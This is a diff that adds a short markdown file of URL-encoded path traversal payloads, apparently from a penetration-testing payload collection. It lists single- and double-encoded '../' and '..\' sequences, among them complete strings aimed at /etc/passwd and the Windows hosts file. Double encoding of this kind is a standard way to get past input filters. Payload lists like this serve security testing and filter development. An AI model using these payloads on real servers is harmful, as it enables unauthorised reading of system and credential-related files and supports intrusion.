@@ -1,0 +1,11 @@
+# URL Encoded Traversal Payloads
+
+Single encoding:
+%2e%2e%2f (../)
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%5c (..\)
+%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cSystem32%5chosts
+
+Double encoding:
+%252e%252e%252f (../ after double decode)
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
